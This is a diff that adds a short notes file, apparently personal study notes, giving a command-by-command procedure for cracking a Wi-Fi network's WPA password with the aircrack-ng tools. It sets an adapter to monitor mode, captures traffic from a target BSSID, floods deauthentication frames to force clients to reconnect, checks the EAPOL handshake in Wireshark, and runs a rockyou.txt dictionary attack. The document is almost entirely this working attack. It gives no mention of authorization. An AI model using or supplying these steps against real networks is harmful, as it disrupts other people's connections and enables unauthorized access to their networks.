@@ -1,0 +1,25 @@
+// To check whether WIFI adapter is connected or not. If not, go to "USB" in "Devices" on the header in VM Virtualbox and select the interface of your network adapter. Its name mostly starts with "Realtek". 
+
+$ iwconfig
+
+$ sudo airmon-ng check kill
+
+$ sudo airmon-ng start <interface>
+
+$ sudo airodump-ng <interface>
+
+$ sudo airodump-ng -w <wpa handshake filename> -c <channel of target> --bssid <bssid of target> <interface>
+
+$ sudo aireplay-ng --deauth 0 -a <bssid of target> <interface>
+
+// After this step, wait for the WPA handshake capture. Once done, it will be displayed on the top right corner of the airodump-ng screen.
+
+$ ls
+
+// Search for the files with ".cap" extension. We will denote it with "<.cap file>".
+
+$ wireshark <.cap file>.cap
+
+// In wireshark, filter "eapol" and then open "801.2x authentication" in the packets. View the WPA key data. If it is not empty, then go to next step. Else, check the other files, if there, in ls.
+
+$ aircrack-ng <.cap file>.cap -w /usr/share/wordlists/rockyou.txt
